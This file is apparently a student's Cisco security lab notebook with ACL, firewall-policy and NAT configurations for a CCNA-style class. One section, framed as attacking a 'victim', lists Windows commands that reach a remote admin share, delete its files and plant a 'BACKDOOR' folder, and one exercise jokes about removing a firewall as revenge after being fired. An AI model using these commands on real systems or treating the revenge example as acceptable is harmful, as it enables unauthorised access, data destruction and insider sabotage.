@@ -1,0 +1,248 @@
+Task1: Basic Cisco Security
+Standard Access-list: block IP address Only.
+@edge:
+conf T
+NO access-list 1
+access-list 1 permit 10.21.0.0 0.0.255.255
+access-list 1 permit 10.31.0.0 0.0.255.255
+access-list 1 permit 10.41.0.0 0.0.255.255
+access-list 1 permit 10.51.0.0 0.0.255.255
+Int Gi 0/0/1
+ ip access-Group 1 in
+ do sh access-list 1
+
+!!! command: NO access-list 1 - used to kill any access list beforehand 
+
+tempo disable:
+Int Gi 0/0/1
+ no ip access-Group 1 in
+ do sh access-list 1
+
+ List for only my column:
+ conf T
+NO access-list 2
+access-list 2 permit 10.21.0.0 0.0.255.255
+access-list 2 permit 10.31.0.0 0.0.255.255
+access-list 2 permit 10.41.0.0 0.0.255.255
+access-list 2 permit 10.51.0.0 0.0.255.255
+Int Gi 0/0/1
+ ip access-Group 2 in
+ do sh access-list 2
+
+Int Gi 0/0/1
+ no ip access-Group 2 in
+ do sh access-list 2
+ List for 
+
+ How to attak 135/445 (weakness of microsoft) of your victim 
+ cmd
+ net use \\10.32.1.10\ipc$ /user:administrator
+  "command completed successfully"=Lahi ng hacker
+
+net use x: \\10.32.1.10\c$ 
+
+ x: dir /ah 
+    attrib -s -r -h *.*
+    del *.*
+ MKDIR pumasoksi___saBACKDOOR
+
+
+ TASK2: CONFIGURING BASIC CISCO FIREWALL:
+ STEP 1: MAKE CUCM VERY HACKABLE:
+ PC: nmap -v 10.31.100.8
+ @CUCM:
+ conf t 
+ Servuce tcp-small-servers
+ service udp-small-servers 
+ service finger
+ ip dns server
+ ip http server
+ ip http secure-server
+ Int Fa 0/0
+  ip add 10.31.100.9 255.255.255.0 Secondary
+  end
+
+@pc:
+ping 10.m.1.10
+ping 10.m.1.4
+ping 10.m.100.8
+ping 10.m.100.9
+ping 10.m.m.1
+ping 10.m.100.101
+ping 10.m.100.102
+Drive host file of windows: C:\Windows\System32\drivers\etc
+
+TASK3: How to secure your company using Firewall 
+@CUCM:
+ip host cm 10.31.100.8
+ip host cm2 10.31.100.9
+ip host pc 10.31.1.4
+ip host sw 10.31.100.4
+ip host p1 10.31.100.101
+ip host p2 10.31.100.102
+
+CyberSecurity:
+UTM= Unified Threat Manaement:
+1.Firewall
+2.VPNsite2site
+3.AntiVirus
+4.IntrusionDetectionSystemPrevention: ips/ids: SNORT(The king)
+5.NAC:network Admission Control 
+6. Dakilang sumbungero:
+ SEIM = Security Event Info Manager: LogRythim/splunk
+
+ TOPBRANDS:
+ 1.PALO ALTO CyberSecurity
+ 2.CheckPoint CyberSecurity
+ 3.Cisco ASA/Firepower
+ 4.FortinetFortigate
+
+ Sophos was chosen by the military, very strong in the Ph
+
+ LevelofGreatness:
+ godMode: A.I. applicationNextGen Firewall 
+ GreatFW: NextGeneration Firewall, statefull
+ Pwedena: packetfilter firewall = "Cisco extended ACL"
+
+TASK4: MAKE A FIREWALL Policy to meet these conditions:
+cm is a company website,protectIT
+  80,433,2000
+cm2 is a DNS, and ssh server.protectIT
+  53,22
+
+Extended Name Access-list:
+@CUCM:  PROTOCOL:tcp,udp,IP,icmp  HACKER VICTIM PORT
+conf T
+no ip access-list extended FP1
+ip access-list extended FP1
+ permit tcp Any host cm EQ 80 log 
+ permit tcp Any host cm EQ 443 log 
+ permit tcp Any host cm EQ 2000 log 
+ permit tcp Any host cm2 EQ 53 log 
+ permit tcp Any host cm2 EQ 22 log
+ Int fa 0/0
+    ip access-group FP1 in
+    do sh access-list FP1
+
+Example 2: make a firewallPolicy for these:
+cm is a http, ssh, dns server only
+cm2 is a https.,telnet,ssh
+conf T
+no ip access-list extended FP2
+ip access-list extended FP2
+ permit tcp Any host cm EQ 80 log 
+ permit tcp Any host cm EQ 22 log 
+ permit tcp Any host cm EQ 53 log 
+ permit tcp Any host cm2 EQ 443 log 
+ permit tcp Any host cm2 EQ 23 log
+ permit tcp Any host cm2 EQ 22 log
+ Int fa 0/0
+    ip access-group FP2 in
+    do sh access-list FP2
+
+Ex3: you have been fired! w/o Reason:
+revenge: remove firewall"
+Int Fa 0/0
+ no ip access-group FP2 in
+
+Ex4: Creat FP3 to allow:
+cm allow: finger,daytime,sscp,sip
+cm2 allow: ssh,telnet,dns,ping(icmp)
+
+conf T
+no ip access-list extended FP3
+ip access-list extended FP3
+ permit tcp Any host cm EQ 79 log 
+ permit tcp Any host cm EQ 13 log 
+ permit tcp Any host cm EQ 2000 log 
+ permit tcp Any host cm EQ 5060 log 
+ permit tcp Any host cm2 EQ 22 log 
+ permit tcp Any host cm2 EQ 23 log
+ permit tcp Any host cm2 EQ 53 log
+ permit icmp Any host cm2 
+ Int fa 0/0
+    ip access-group FP3 in
+    do sh access-list FP3
+
+Ex5: create NOLAMON Policy to meet these conditions:
+cm allow ping, sip, web, secureWeb.
+cm2 allow ssh, telnet, dns, sccp, finger
+hint: 9 Lines 
+
+conf T
+no ip access-list extended NOLAMON
+ip access-list extended NOLAMON
+ permit icmp Any host cm
+ permit tcp Any host cm EQ 5060 log 
+ permit tcp Any host cm EQ 80 log 
+ permit tcp Any host cm EQ 443 log 
+ permit tcp Any host cm2 EQ 22 log 
+ permit tcp Any host cm2 EQ 23 log 
+ permit tcp Any host cm2 EQ 53 log
+ permit tcp Any host cm2 EQ 2000 log
+ permit tcp Any host cm2 EQ 79 log
+ Int fa 0/0
+    ip access-group NOLAMON in
+    do sh access-list NOLAMON
+
+
+EX6: Make a policy BREAKTIME 
+cm open All even ports
+cm2 open ping, Oddnumber ports
+
+conf T
+no ip access-list extended BREAKTIME
+ip access-list extended BREAKTIME
+ permit tcp Any host cm EQ 22 log 
+ permit tcp Any host cm EQ 80 log 
+ permit tcp Any host cm EQ 1720 log 
+ permit tcp Any host cm EQ 2000 log 
+ permit tcp Any host cm EQ 5060 log 
+ permit tcp Any host cm2 EQ 7 log 
+ permit tcp Any host cm2 EQ 9 log 
+ permit tcp Any host cm2 EQ 13 log
+ permit tcp Any host cm2 EQ 19 log
+ permit tcp Any host cm2 EQ 23 log
+ permit tcp Any host cm2 EQ 53 log
+ permit tcp Any host cm2 EQ 79 log
+ permit tcp Any host cm2 EQ 443 log
+ permit tcp Any host cm2 EQ 5061 log
+ permit icmp Any host cm2
+
+ Int fa 0/0
+    ip access-group BREAKTIME in
+    do sh access-list BREAKTIME
+
+Int Fa 0/0
+ no ip access-group BREAKTIME in
+
+ TASK 6: 4TH AND FINAL LAB IN CCNA EXAM:
+ Network Address Translation.
+ @EDGE:
+ sh run int gi 0/0/1
+ 
+ @NAT=metwork address Translation
+ M.S=Proxy, Apple=Hotspot, Android=tethering
+@EDGE:
+conf T
+access-list 8 permit 10.31.0.0 0.0.255.255
+int gi 0/0/0
+ ip Nat Inside 
+Int gi 0/0/1
+ ip nat outside 
+ ip nat inside source list 8 int Gi 0/0/1 Overload
+ ip nat inside source static 10.31.1.10 200.0.0.131
+ !ip nat inside source static tcp 10.31.1.10 80 200.0.0.131 8080
+ do sh ip nat Translation 
+
+ Kill@:
+ PC:stop ping ctrl c 
+ clear ip nat Translation *
+conf t
+ int gi 0/0/0
+ no ip Nat Inside 
+Int gi 0/0/1
+ no ip nat outside 
+
+ TASK7: 15% EXAM. Entering the World of Devops
+ 
